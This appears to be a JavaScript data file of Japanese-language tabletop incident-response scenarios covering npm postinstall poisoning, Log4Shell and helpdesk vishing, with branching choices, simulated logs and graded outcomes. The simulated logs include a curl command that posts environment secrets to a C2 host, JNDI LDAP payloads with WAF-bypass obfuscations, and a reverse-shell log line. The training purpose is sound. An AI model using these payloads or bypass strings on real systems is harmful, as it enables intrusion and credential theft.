        description: 'GitHub ActionsのCI/CDログ監視において、npm install実行時に `node postinstall.js` が起動し、ビルドランナー内の全環境変数（STRIPE_SECRET_KEY, DATABASE_URL, AWS_SECRET_ACCESS_KEY）を海外C2サーバー `https://collector-telemetry-cdn.com` へ送信したログが残されていました。',
        severity: 'critical',
        situationSummary: 'ビルドは完了し、ステージングおよび本番環境への自動デプロイパイプライン（CD）がトリガー寸前。',
        telemetryLogs: [
          { timestamp: '14:20:10', source: 'GitHub Actions Step: npm install', level: 'CRITICAL', message: 'postinstall hook executed: curl -X POST -d "$ENV_DUMP" https://collector-telemetry-cdn.com/upload' },
          { timestamp: '14:21:00', source: 'Step: Deploy to Production', level: 'ALERT', message: 'Waiting for deployment approval (Pending 5 minutes timer)' }
        ],
        choices: [
          {
            id: 'c1_cancel_cd_rotate_secrets',
            label: '本番デプロイワークフローを即座にキャンセル・本番決済APIキーとDBパスワードを直ちに全件ローテーション',
            actionType: 'containment',
            timeCostMinutes: 10,
            description: '悪意あるコードを含むフロントエンド成果物の本番公開を阻止。持ち出されたAPIキーとクレデンシャルをAWS/Stripe側で即座に失効させて再発行する。',
            tacticalRationale: '最善の判断。毒入れされたコードがエンドユーザーのブラウザに届くのを未然に防ぎ、漏洩したSecretsを即座に無価値化できる。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -15, downtime: 10, trust: +5 },
            logOutput: [
              '[CI/CD] Workflow run #4928 CANCELLED manually.',
              '[STRIPE] Secret Key revoked and rotated.',
              '[AWS IAM] Compromised CI/CD deployment credentials revoked.',
              '[RDS] Production database password rotated with zero downtime pool.'
            ],
            nextNodeId: 'npm_02_lockfile_audit'
          },
          {
            id: 'c1_let_deploy_inspect_later',
            label: '本日のリリーススケジュールを優先し、デプロイを通してからコードをゆっくり精査する',
            actionType: 'remediation',
            timeCostMinutes: 45,
            description: 'リリース遅延を避けるため、とりあえず本番反映させてから調査する。',
            tacticalRationale: '致命的な過失。毒入りスクリプトがユーザーのブラウザ上で実行され、250万人のユーザーの決済クレジットカード情報やセッションが攻撃者サーバーへ一斉に盗まれる。',
            impact: { spread: 45, exfiltration: 50, downtime: 30, trust: -50 },
            logOutput: [
              '[CD] Production release v2.4.0 deployed to CloudFront CDN.',
              '[MALWARE] In-browser keylogger activated across 250,000 active mobile sessions.',
              '[DISASTER] Credit card numbers and CVVs intercepted on checkout page!'
            ],
            nextNodeId: 'npm_02_production_breach'
          }
        ]
      },

      npm_02_lockfile_audit: {
        id: 'npm_02_lockfile_audit',
        phase: 'Phase 2: 依存関係の固定とSBOM・ハッシュ完全性検証 (T+00:30)',
        title: 'ロックファイルの安全ピン留めと署名付き検証',
        description: 'デプロイ停止とキーローテーションにより、ユーザー被害とインフラ侵害を完全阻止。調査の結果、開発者が `package.json` で `^1.2.0`（キャレット指定）を使用していたため、攻撃者が公開した悪意のマイナーバージョン（1.2.9）が自動インストールされたことが判明しました。',
        severity: 'high',
        situationSummary: '悪意のパッケージの特定完了。健全なバージョンへのロールバックとCI/CD強化が必要。',
        telemetryLogs: [
          { timestamp: '14:50:00', source: 'npm audit', level: 'WARN', message: 'Package event-stream-helper@1.2.9 flagged as malicious in npm registry advisory' },
          { timestamp: '14:55:00', source: 'DevSecOps', level: 'INFO', message: 'package-lock.json integrity hash verification can be enforced using "npm ci".' }
        ],
        choices: [
          {
            id: 'c2_enforce_npm_ci_sbom',
            label: 'CI/CDでの "npm ci" 厳格適用（package-lock.json完全固定）、Dependabot署名検証とSocket/Snyk自動スキャン導入',
            actionType: 'remediation',
            timeCostMinutes: 40,
            description: 'npm install（自動更新）をビルド環境で禁止し、コミットされたロックファイルのみをインストールする npm ci に切り替え。ビルド前パッケージスキャンを義務付ける。',
            tacticalRationale: 'サプライチェーンセキュリティの決定打。ロックファイルでハッシュ値を厳密固定することで、サードパーティが勝手に更新した毒入れコードの混入を物理的に排除する。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: -10, downtime: 5, trust: +15 },
            logOutput: [
              '[GIT] Replaced "npm install" with "npm ci --ignore-scripts" in workflow yaml.',
              '[SECURITY SCAN] Snyk security gate integrated: Auto-block packages with network-in-postinstall.',
              '[RELEASE] Clean build validated. Version v2.4.1 released safely.'
            ],
            nextNodeId: 'npm_03_terminal_secured_s'
          }
        ]
      },

      npm_02_production_breach: {
        id: 'npm_02_production_breach',
        phase: 'Phase 2: クレジットカード漏洩と緊急サービス全面停止 (T+01:30)',
        title: 'クレジットカード情報大量流出と決済停止処分',
        description: 'リリース優先の判断により、本番環境の決済画面で悪意のスクリプトが稼働し、4時間で約14,000件のクレジットカード番号・有効期限・CVVが流出しました。Visa/Mastercardブランドおよび決済代行会社から緊急の決済停止処分が下されました。',
        severity: 'critical',
        situationSummary: '重大インシデント。全決済機能の強制停止、被害者へのカード再発行補償。',
        telemetryLogs: [
          { timestamp: '16:00:00', source: 'Payment Gateway', level: 'CRITICAL', message: 'Merchant account suspended due to confirmed carding leak originating from checkout.js' },
          { timestamp: '16:15:00', source: 'National Police', level: 'CRITICAL', message: 'Fraudulent transactions detected across 1,200 foreign ATM locations.' }
        ],
        choices: [
          {
            id: 'c2b_rollback_pci_audit',
            label: '全キャッシュのパージ・前バージョンへの緊急ロールバック・PCI DSSフォレンジック監査の受任と全顧客補償',
            actionType: 'communication',
            timeCostMinutes: 90,
            description: '即座に旧安全バージョンへ戻し、カード会社と連携して被害顧客のカード停止・再発行費用を全額負担する。',
            tacticalRationale: '損害は甚大だが誠実な収拾策。被害額を確定させ、全カードの不正利用モニタリングと再発行を進めることで更なる二次被害を防ぐ。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 15, downtime: 40, trust: -45 },
            logOutput: [
              '[CLOUDFRONT] Invalidation dispatched. Rolled back to v2.3.9.',
              '[CARD ISSUERS] 14,000 compromised cards blocked and scheduled for re-issue.',
              '[PCI-SSC] QSA forensic investigation commenced.'
            ],
            nextNodeId: 'npm_03_terminal_breach_f'
          }
        ]
      },

      npm_03_terminal_secured_s: {
        id: 'npm_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】サプライチェーン毒入れの阻止とDevSecOpsの進化',
        description: 'CI/CDでの不審通信アラートを無視せず即時デプロイを中止したことで、エンドユーザーへのマルウェア配信を1ミリ秒も許さず完全に阻止しました。さらにnpm ciとシークレットローテーションを徹底し、セキュアなソフトウェアサプライチェーンを確立しました。',
        severity: 'contained',
        situationSummary: '顧客情報漏洩: ゼロ。本番サービス停止: ゼロ。サプライチェーン防衛成功。',
        telemetryLogs: [
          { timestamp: '17:00:00', source: 'DevSecOps Command', level: 'INFO', message: 'Incident closed. Software Bill of Materials (SBOM) generation active.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'ソフトウェアサプライチェーン侵害への模範的初動',
          summary: '「リリース圧力に屈せず疑わしいビルドを即座に破棄」「漏洩Secretsの即時ローテーション」「npm ci による厳格なハッシュ固定」という現代DevSecOpsの黄金ルールを完遂しました。',
          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約5億8,000万円（カード再発行費・PCI違約金・損害賠償）',
          legalImpact: '個人情報保護法・割賦販売法に基づく漏洩報告義務違反なし。',
          complianceStatus: 'PCI DSS v4.0 / NIST SP 800-218 (SSDF) 適合',
          recommendedPractices: [
            '本番ビルド環境では必ず npm ci（または pnpm install --frozen-lockfile）を用い、ロックファイルのハッシュを検証する',
            'npmパッケージの postinstall フックは予期せぬスクリプト実行の温床となるため、--ignore-scripts を原則とする',
            'CI/CDランナーから外部インターネットへの外向き通信（Egress）をホワイトリスト限定にする'
          ]
        }
      },

      npm_03_terminal_breach_f: {
        id: 'npm_03_terminal_breach_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】リリース優先が生んだクレジットカード大量流出の悲劇',
        description: 'スケジュールを優先して毒入りコードを本番デプロイした結果、14,000件のクレジットカード情報が漏洩しました。カード会社からの巨額の再発行手数料請求、決済機能停止による売上ゼロ、割賦販売法違反による行政処分により、サービス存続の危機に陥りました。',
        severity: 'critical',
        situationSummary: '14,000件のカード情報流出。決済ライセンス剥奪危機。',
        telemetryLogs: [
          { timestamp: '18:00:00', source: 'Ministry of Economy', level: 'CRITICAL', message: 'Administrative guidance issued under Installment Sales Act.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: 'セキュリティ警告の軽視が招いた壊滅的侵害',
          summary: '「スケジュール優先でセキュリティ警告を後回しにする」という判断が、Webサービスの致命傷となりました。',
          financialEstimate: '被害損害額: 約4億2,000万円（カード再発行費用・損害賠償・決済停止損失）',
          legalImpact: '割賦販売法および個人情報保護法に基づく是正命令、集団訴訟。',
          complianceStatus: 'PCI DSS 認証失効',
          recommendedPractices: [
            '「疑わしいビルド成果物は絶対に本番公開しない」ことをデプロイポリシーとして厳格に明文化する',
            '本番環境に接続するSecretsは短命のOIDCトークンとし、静的なキーの持ち出しリスクを低減する'
          ]
        }
      }
    }
  }
,
  {
    id: 'scenario_log4shell',
    title: 'Log4j (Log4Shell) ゼロデイ脆弱性悪用 & Java基幹サーバー侵入',
    subtitle: '実在モデル: 2021年 Log4Shell (CVE-2021-44228) 世界同時多発攻撃',
    difficulty: '中級 (実務CSIRT)',
    category: 'Zero-Day & Perimeter',
    estimatedTime: '15〜20分',
    initialNodeId: 'log4_01_alert',
    initialMetrics: {
      spread: 20,
      exfiltration: 15,
      downtime: 10,
      trust: 90,
    },
    briefing: {
      targetOrganization: '大手ECポータル & オンライン決済基盤（月間流通額 450億円）',
      discoveredAlert: 'EC検索クエリ処理クラスター(search-cluster-04)にて、User-Agentヘッダー経由の難読化JNDI LDAP参照文字列 (${jndi:ldap://...}) と、不審な外部IPへのLDAP外向き通信(Port 1389)を検知。',
      incidentOfficer: 'CSIRT インフラ防御班リード',
      immediateObjective: '外部C2/LDAPサーバーへのEgress遮断、クラスター内のWebShell設置阻止、環境変数(FORMAT_MSG_NO_LOOKUPS)設定およびLog4j 2.17+緊急更新による完全封じ込め。',
    },
    imagePath: '/src/assets/images/scenario_log4shell_1793938135016.jpg',
    nodes: {
      log4_01_alert: {
        id: 'log4_01_alert',
        phase: 'Phase 1: ゼロデイ攻撃検知 & トリアージ (T+00:00)',
        title: 'User-Agentヘッダー経由のJNDI Injectionと外向きLDAP通信',
        description: '午前11時28分、WAFおよびネットワーク監視が、ECサイト検索エンドポイントに対する不審なペイロードを検知。検索ログを処理するJavaバックエンドが ${jndi:ldap://194.168.1.10:1389/Exploit} を解釈し、社内から外部へのアウトバウンド接続が確立されかけています。',
        severity: 'critical',
        situationSummary: '攻撃者はJavaのJNDI参照機能を通じて外部クラスファイルのダウンロード・リモートコード実行(RCE)を試行中。',
        telemetryLogs: [
          { timestamp: '11:28:10', source: 'Palo Alto FW', level: 'ALERT', message: 'Outbound TCP connection to 194.168.1.10:1389 (LDAP) initiated from search-cluster-04' },
          { timestamp: '11:28:22', source: 'AWS WAF', level: 'WARN', message: 'Suspicious URI/Header regex match: ${jndi:ldap:...} detected in HTTP User-Agent' },
          { timestamp: '11:29:05', source: 'Linux Auditd', level: 'CRITICAL', message: 'Java process (PID 8820) spawned /bin/sh child process on search-cluster-04' }
        ],
        choices: [
          {
            id: 'c1_egress_block_env_flag',
            label: 'Firewallで外部宛てLDAP/RMIポート(389/636/1099/1389)を即時全遮断 & 環境変数 LOG4J_FORMAT_MSG_NO_LOOKUPS=true を即時全台投入',
            actionType: 'containment',
            timeCostMinutes: 8,
            description: '外部C2からの悪意あるJavaクラスファイルダウンロードをネットワーク層で物理遮断しつつ、Log4jのメッセージルックアップ機能を無効化する。',
            tacticalRationale: '最善の初動。Log4Shellは外部へのLDAP/RMIアウトバウンド通信に依存するため、Egressを遮断するだけでRCEコードの取得を即時無力化できる。さらにルックアップ無効化フラグにより社内再発を防止。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -10, downtime: 5, trust: 0 },
            logOutput: [
              '[FIREWALL] Outbound LDAP/RMI ports blocked globally across VPC.',
              '[SEARCH-CLUSTER] Applied LOG4J_FORMAT_MSG_NO_LOOKUPS=true across all 32 containers.',
              '[SOC] Outbound beaconing to 194.168.1.10 TERMINATED.'
            ],
            nextNodeId: 'log4_02_patch_and_investigate'
          },
          {
            id: 'c1_restart_all_servers',
            label: 'メモリ上の攻撃コードを消去するため、検索クラスター全サーバーを即座に再起動',
            actionType: 'containment',
            timeCostMinutes: 15,
            description: '全サーバーをリブートして揮発性メモリをリフレッシュする。',
            tacticalRationale: '悪手。脆弱性そのものが解消されていないため、起動直後に自動スキャンツールから再びJNDIリクエストが着信して即座に再感染する。また、フォレンジック用メモリ証拠も消失する。',
            impact: { spread: 20, exfiltration: 15, downtime: 25, trust: -10 },
            logOutput: [
              '[K8S] Rolling restart triggered across search-cluster.',
              '[FORENSICS] Process memory and in-memory payload wiped without capture.',
              '[ALERT] Re-exploitation successful within 40 seconds of boot on search-cluster-01.'
            ],
            nextNodeId: 'log4_02_re_exploit'
          },
          {
            id: 'c1_waf_regex_only',
            label: 'サーバーには手を加えず、WAFのブラックリスト文字列ルール追加のみで対処を試みる',
            actionType: 'containment',
            timeCostMinutes: 30,
            description: '文字列 "${jndi:" をWAFでブロックするカスタムルールを書いて様子を見る。',
            tacticalRationale: '極めて危険。Log4jのパーサーはネストや文字置換を許容するため、${${lower:j}ndi:...} や ${${env:ENV_NAME:-j}ndi:...} といった無数の難読化でWAFを容易にバイパスされる。',
            impact: { spread: 40, exfiltration: 35, downtime: 15, trust: -25 },
            logOutput: [
              '[WAF] Rule "${jndi:" active.',
              '[BYPASS] Inbound payload "${${lower:j}${lower:n}di:ldap://...}" BYPASSED WAF inspection!',
              '[EDR CRITICAL] Reverse shell established to 45.142.212.8:4444. WebShell dropped to /var/www/search/html/shell.jsp'
            ],
            nextNodeId: 'log4_02_webshell_compromise'
          }
        ]
      },

      log4_02_patch_and_investigate: {
        id: 'log4_02_patch_and_investigate',
        phase: 'Phase 2: 脆弱性根本修正 & 侵入痕跡フォレンジック (T+00:30)',
        title: 'Log4j 2.17.1への緊急バージョンアップとWebShell探索',
        description: 'Egress遮断により外部からの悪意あるJavaクラスダウンロードは阻止成功。次に、クラスター内にWebShellやバックドアが残存していないかを検証し、根本修正であるLog4j 2.17.1へのアップデートを完了する必要があります。',
        severity: 'high',
        situationSummary: '攻撃通信は遮断中。過去数時間で別ホストへの侵入がなかったかのログ精査と、安全な最新ビルドの適用が急務。',
        telemetryLogs: [
          { timestamp: '11:45:00', source: 'CrowdStrike Falcon', level: 'INFO', message: 'Full container filesystem scan underway. No unknown JSP/ELF binaries detected.' },
          { timestamp: '11:48:30', source: 'CI/CD Pipeline', level: 'INFO', message: 'Pull Request: Bump org.apache.logging.log4j:log4j-core from 2.14.1 to 2.17.1 (Tested & Passed unit checks)' }
        ],
        choices: [
          {
            id: 'c2_deploy_patch_and_verify',
            label: '検証済みLog4j 2.17.1コンテナイメージをローリングアップデート & JndiLookup.class完全削除の検証とSIEM横断検索',
            actionType: 'remediation',
            timeCostMinutes: 30,
            description: '依存ライブラリを根本修正バージョンへ刷新し、JNDI呼び出し機能を安全に無効化。社内全システムのアクセスログから過去のJNDI攻撃文字列を逆引き調査する。',
            tacticalRationale: '理想的な終息手順。根本パッチの適用と過去ログの完全精査を両輪で行うことで、潜在的な潜伏脅威を完全に排除できる。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -5, downtime: 5, trust: +10 },
            logOutput: [
              '[K8S] Rolling deploy v3.12.4 (Log4j 2.17.1) complete across 32 search pods.',
              '[VERIFY] jar tf log4j-core-2.17.1.jar | grep -i jndi -> Lookup sanitized.',
              '[SIEM] Backward log correlation from T-72h shows 0 prior lateral movements.'
            ],
            nextNodeId: 'log4_03_terminal_secured_s'
          }
        ]
      },

      log4_02_re_exploit: {
        id: 'log4_02_re_exploit',
        phase: 'Phase 2: 再起動後の再侵入とクリプトマイナー感染 (T+00:45)',
        title: '脆弱性未解消による再侵入とマイニングマルウェア感染',
        description: '再起動によって一時的にプロセスは消去されたものの、脆弱なLog4j 2.14.1が稼働し続けたため、世界中の自動スキャナーから再度JNDIインジェクションを受け、XMRigクリプトマイナーが全ポッドへ感染しました。CPU使用率が100%に張り付き、決済APIの応答遅延が発生しています。',
        severity: 'critical',
        situationSummary: 'クラスター全体がマイニングボットネット化。決済処理に大幅な遅延。',
        telemetryLogs: [
          { timestamp: '12:15:00', source: 'AWS CloudWatch', level: 'CRITICAL', message: 'CPUUtilization >= 99.8% on all 32 search-cluster nodes' },
          { timestamp: '12:18:22', source: 'Payment Gateway', level: 'ALERT', message: 'Checkout API p99 latency spiked from 120ms to 42,000ms' }
        ],
        choices: [
          {
            id: 'c2_emergency_isolation_patch',
            label: '検索クラスターを一時的にメンテナンスモードへ移行・Egress完全遮断・Log4j 2.17.1強制適用と全コンテナ破棄再作成',
            actionType: 'remediation',
            timeCostMinutes: 60,
            description: '感染した全コンテナを破棄し、パッチ適用済み新イメージから安全に再展開する。',
            tacticalRationale: '初動の遅延は痛いが、コンテナのイミュータブル性を活かして感染コンテナを一掃し、根本パッチを当てることでこれ以上の被害を食い止める。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -5, downtime: 30, trust: -10 },
            logOutput: [
              '[STATUSPAGE] Maintenance notice published for search feature.',
              '[K8S] Destroyed all infected search-cluster pods.',
              '[DEPLOY] Rebuilt from clean repository with Log4j 2.17.1.'
            ],
            nextNodeId: 'log4_03_terminal_secured_b'
          }
        ]
      },

      log4_02_webshell_compromise: {
        id: 'log4_02_webshell_compromise',
        phase: 'Phase 2: WebShell設置とデータベース認証情報の奪取 (T+01:00)',
        title: 'WAFバイパスによるWebShell設置とDBクレデンシャル流出',
        description: '難読化JNDIによりWAFをすり抜けた攻撃者は、サーバー内にWebShell (shell.jsp) をドロップ。環境変数から本番データベースの接続パスワードを読み出し、顧客の注文履歴テーブルからデータを外部転送し始めました。',
        severity: 'critical',
        situationSummary: '重大インシデント。本番DB侵害と機密データ外部転送が進行中。',
        telemetryLogs: [
          { timestamp: '12:30:10', source: 'GuardDuty', level: 'CRITICAL', message: 'UnauthorizedAccess:RDS/AnomalousVolumeOfDataExfiltrated to external IP 45.142.212.8' },
          { timestamp: '12:32:00', source: 'Database Audit', level: 'CRITICAL', message: 'SELECT * FROM users_orders_payment executed by search_app user' }
        ],
        choices: [
          {
            id: 'c2_emergency_db_revoke_off',
            label: '本番DBパスワードの即時失効・検索サービス全停止・個人情報保護委員会への72時間以内速報',
            actionType: 'containment',
            timeCostMinutes: 90,
            description: 'データ流出を止めるためDB認証情報を失効させ、侵害サーバーを完全オフラインにしてフォレンジック調査と公的報告を開始する。',
            tacticalRationale: '被害は拡大したが、漏洩をこれ以上広げないための最後の防衛策。法的手続きと顧客通知に速やかに移行する。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 20, downtime: 45, trust: -40 },
            logOutput: [
              '[RDS] Revoked user search_app credentials. Active queries killed.',
              '[INGRESS] Search service diverted to offline error page.',
              '[LEGAL] Incident notification prepared for PPC (Personal Information Protection Commission).'
            ],
            nextNodeId: 'log4_03_terminal_breached_f'
          }
        ]
      },

      log4_03_terminal_secured_s: {
        id: 'log4_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】Egress制御と環境変数即応によるLog4Shell完全封じ込め',
        description: '「外部へのLDAP/RMI通信の即時遮断」と「LOG4J_FORMAT_MSG_NO_LOOKUPS フラグ投入」という実務上最も効果的な二段構えを迅速に実行したことで、ゼロデイ攻撃によるRCEを1件も成立させず、完全無傷で防御しました。',
        severity: 'contained',
        situationSummary: '情報漏洩: ゼロ。サービス停止時間: 5分未満。ゼロデイ防御成功。',
        telemetryLogs: [
          { timestamp: '13:00:00', source: 'CSIRT Command', level: 'INFO', message: 'Log4Shell incident closed successfully. All downstream microservices verified safe.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: '歴史的ゼロデイ脆弱性に対する教科書的インフラ防御',
          summary: 'WAFのシグネチャに過信せず、「Egress（外向き）通信の遮断」というネットワーク境界防御の原則を貫き、攻撃者のペイロード実行メカニズムを物理的に無力化しました。',
          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約8億4,000万円（全社データ侵害・サービス長期停止時の想定損害）',
          legalImpact: '顧客データ流出なし。行政への事故報告義務免除。',
          complianceStatus: 'PCI DSS / SOC2 Type II 適合維持',
          recommendedPractices: [
            '本番サーバーのアウトバウンド通信はデフォルト拒否（Default Deny）とし、不要なポート(LDAP/RMI等)は恒久的に遮断する',
            'オープンソースライブラリの脆弱性に対し、WAFのみに依存せずランタイム設定（環境変数・フラグ）での緩和策を迅速に適用する',
            'SBOM（ソフトウェア部品表）を常時整備し、Log4jなどの主要共通コンポーネントの利用箇所を数分で特定できるようにする'
          ]
        }
      },

      log4_03_terminal_secured_b: {
        id: 'log4_03_terminal_secured_b',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Bランク】一時的マイニング感染を許すもデータ流出は回避',
        description: '初動での安易な再起動によりマイニングマルウェアの感染と一時的なサービス遅延を招きましたが、その後の迅速なコンテナ破棄と根本パッチ適用により、機密データや顧客情報の流出は水際で阻止しました。',
        severity: 'medium',
        situationSummary: '顧客データ流出: ゼロ。一時的ECサイト遅延: 約60分。',
        telemetryLogs: [
          { timestamp: '13:30:00', source: 'CSIRT Command', level: 'INFO', message: 'Cryptominer cleaned. Production cluster restored.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'B',
          title: '初動の判断ミスをリビルドで巻き返したリカバリー',
          summary: '「脆弱性が残ったままの再起動は再感染を招く」という教訓を残したものの、クラウドネイティブなコンテナ再構築により損害を最小限に抑えました。',
          financialEstimate: '被害損害額: 約1,200万円（EC売上遅延機会損失・インフラ追加コスト）',
          legalImpact: '個人情報漏洩なし。',
          complianceStatus: '是正措置計画書の社内提出',
          recommendedPractices: [
            '「再起動すれば治る」という発想を捨て、原因となる脆弱性の特定と通信遮断を優先する',
            'コンテナのオートスケーリングが不正プロセスによってリソース枯渇を起こさないよう、異常プロセス検知を自動化する'
          ]
        }
      },

      log4_03_terminal_breached_f: {
        id: 'log4_03_terminal_breached_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】難読化WAFバイパスによるWebShell常駐と顧客DB大量流出',
        description: 'WAFの単純な文字列ブラックリストに頼り切った結果、難読化JNDIにより容易に侵入され、WebShellを経由して顧客の注文・クレジットカード決済履歴が外部へ流出しました。',
        severity: 'critical',
        situationSummary: '重大漏洩事故。280万件の注文データ流出、ECサイト無期限停止。',
        telemetryLogs: [
          { timestamp: '14:00:00', source: 'National Cyber Agency', level: 'CRITICAL', message: 'Public advisory issued regarding confirmed exfiltration.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: 'WAF盲信が生んだゼロデイ致命的侵害',
          summary: '高度な攻撃者にとってWAFのシグネチャ回避は容易です。サーバー本体の防御設定や外向き通信制限を怠ったことが致命傷となりました。',
          financialEstimate: '被害損害額: 約14億5,000万円（損害賠償・顧客対応・行政制裁金・売上損失）',
          legalImpact: '個人情報保護法に基づく是正命令、集団訴訟のリスク。',
          complianceStatus: 'PCI DSS 認証停止',
          recommendedPractices: [
            'WAFは「多層防御の一枚」に過ぎず、サーバー本体のパッチ適用や最小特権原則を省略する理由にはならない',
            '本番DBへのアクセス権限をWebフロントエンドに過剰に付与せず、アクセス経路とクエリを厳格に制限する'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_helpdesk_vishing',
    title: 'ITヘルプデスク騙り ソーシャルエンジニアリング (Vishing) & IdP特権乗っ取り',
    subtitle: '実在モデル: 2023年 米国大手カジノホテル (MGM/Caesars) & Oktaサポート侵害 (Scattered Spider)',
    difficulty: '中級 (実務CSIRT)',
    category: 'AI & Social Engineering',
    estimatedTime: '15〜20分',
    initialNodeId: 'hd_01_alert',
    initialMetrics: {
      spread: 30,
      exfiltration: 20,
      downtime: 15,
      trust: 85,
    },
    briefing: {
      targetOrganization: '複合エンターテインメント・ホテルリゾートグループ（従業員18,000名）',
      discoveredAlert: 'Okta Identity Provider (IdP) 監査ログにて、社内ITヘルプデスク窓口アカウントが、執行役員CTOのMFAデバイス（FIDO2キー）を削除し、攻撃者名義の新しいモバイルSMS/TOTPトークンを登録した記録を検知。',
      incidentOfficer: 'CSIRT インシデントコマンダー',
      immediateObjective: '不正登録されたMFAデバイスの即時剥奪、全管理者アカウントの緊急棚卸しとセッション無効化、社内ヘルプデスク運用プロトコル（対面・生体・コールバック厳格化）の確立。',
    },
    imagePath: '/src/assets/images/scenario_helpdesk_vishing_1793938148021.jpg',
    nodes: {
      hd_01_alert: {
        id: 'hd_01_alert',
        phase: 'Phase 1: IdP管理者ログでの異常なMFA変更検知 (T+00:00)',
        title: '役員アカウントに対する不審なヘルプデスクMFAリセット',
        description: '午後15時10分、Okta監査ログにて、社内ITヘルプデスク契約社員のアカウント [agent_suzuki] が、執行役員CTO [exec_yamada] のFIDO2セキュリティキーを削除し、未知の電話番号によるSMS認証トークンを新規登録したアラートが発生しました。',
        severity: 'critical',
        situationSummary: '攻撃者はLinkedIn等で収集した社員情報を用いてヘルプデスクへ電話（Vishing）をかけ、本人になりすましてMFAを解除させた疑いあり。',
        telemetryLogs: [
          { timestamp: '15:08:12', source: 'Okta System Log', level: 'ALERT', message: 'User MFA reset: user=exec_yamada initiated by actor=agent_suzuki' },
          { timestamp: '15:09:40', source: 'Okta System Log', level: 'CRITICAL', message: 'New MFA factor enrolled: SMS (+1-202-555-0199) for user=exec_yamada' },
          { timestamp: '15:10:02', source: 'Okta System Log', level: 'CRITICAL', message: 'Admin login success for exec_yamada from unfamiliar ASN (VPN/Proxy in Frankfurt)' }
        ],
        choices: [
          {
            id: 'c1_revoke_sessions_freeze_actor',
            label: 'CTOおよび該当ヘルプデスク担当者の全セッションを即時強制破棄(Clear User Sessions) & アカウント緊急凍結と全社MFA自己変更の一時停止',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: '攻撃者が保持するOktaセッショントークンを即座に無効化し、特権操作権限を剥奪。さらにヘルプデスクによるMFAリセット権限を全社で一時凍結する。',
            tacticalRationale: '最善の初動。IdPが侵入された場合、数分で全クラウドサービス（AWS, Slack, Google Workspace, AD）へシングルサインオン（SSO）で横展開されるため、セッショントークンの即時失効とアカウント凍結が絶対必須。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -10, downtime: 5, trust: +5 },
            logOutput: [
              '[OKTA] Command: Clear All User Sessions executed for exec_yamada and agent_suzuki.',
              '[OKTA] Status updated: Account LOCKED for both identities.',
              '[IDP POLICY] Self-service & Helpdesk MFA resets disabled globally pending authorization.'
            ],
            nextNodeId: 'hd_02_containment_and_call'
          },
          {
            id: 'c1_message_slack_cto',
            label: '社内SlackでCTO宛てにダイレクトメッセージを送り、「ご自身でMFAリセットを依頼されましたか？」と確認する',
            actionType: 'investigation',
            timeCostMinutes: 20,
            description: '役員への配慮から、まず本人にSlackチャットで状況を尋ねる。',
            tacticalRationale: '致命的過失。CTOのOktaアカウントにはすでに攻撃者がログインしており、SlackもSSOで攻撃者が閲覧・返答できる状態にある。「はい、出張先でスマホを壊したため依頼しました」と攻撃者が返答し、欺瞞される。',
            impact: { spread: 35, exfiltration: 30, downtime: 20, trust: -20 },
            logOutput: [
              '[SLACK] Message sent to @exec_yamada.',
              '[SLACK REPLY] "Yes, I requested it because my phone broke in Germany. All good."',
              '[OKTA LOG] exec_yamada created new Super Admin account: okta_emergency_sync@corp.internal',
              '[AWS IAM] AssumeRole OrganizationAccountAccessRole executed from Frankfurt IP!'
            ],
            nextNodeId: 'hd_02_idp_takeover'
          },
          {
            id: 'c1_wait_next_day_meeting',
            label: 'ヘルプデスク運用の通常手続きと見なし、明日の朝会で担当者に経緯を確認するメモを残す',
            actionType: 'investigation',
            timeCostMinutes: 60,
            description: '緊急対応は行わず、日中の業務時間内に調査する。',
            tacticalRationale: '完全な職務怠慢。MGM ResortsやCaesarsの事例では、ヘルプデスク騙りから数時間以内にVMware ESXi環境が全台暗号化され、ホテルのルームキーやカジノスロットが全停止した。',
            impact: { spread: 50, exfiltration: 45, downtime: 40, trust: -35 },
            logOutput: [
              '[INCIDENT TICKET] Low priority ticket created.',
              '[DISASTER] Threat actor accessed VMware vCenter via Okta SSO and initiated ESXi wiper script!',
              '[FACILITY ALERT] 4,200 hotel digital door locks and casino POS terminals disconnected.'
            ],
            nextNodeId: 'hd_02_hotel_outage'
          }
        ]
      },

      hd_02_containment_and_call: {
        id: 'hd_02_containment_and_call',
        phase: 'Phase 2: ヘルプデスク認証プロトコル刷新 & 特権棚卸し (T+00:30)',
        title: '音声コールバック検証の義務化と特権アカウント全監査',
        description: 'セッション強制切断により、攻撃者のOktaコンソール追放に成功。人事部に直接電話確認したところ、本物のCTOは国内本社で役員会議中であり、MFA変更依頼は100%ソーシャルエンジニアリング（偽装電話）であったことが確定しました。',
        severity: 'high',
        situationSummary: '攻撃者のセッションは排除済み。ヘルプデスクの本人確認プロセスの抜本的強化と、他の特権変更がないかの監査が必要。',
        telemetryLogs: [
          { timestamp: '15:25:00', source: 'Corporate Telecom', level: 'WARN', message: 'Inbound call to IT Helpdesk spoofed caller ID of CTO personal mobile via VoIP provider' },
          { timestamp: '15:30:15', source: 'Okta System Log', level: 'INFO', message: 'Audit of last 48h admin role assignments returned 0 other suspicious delegations' }
        ],
        choices: [
          {
            id: 'c2_enforce_out_of_band_verify',
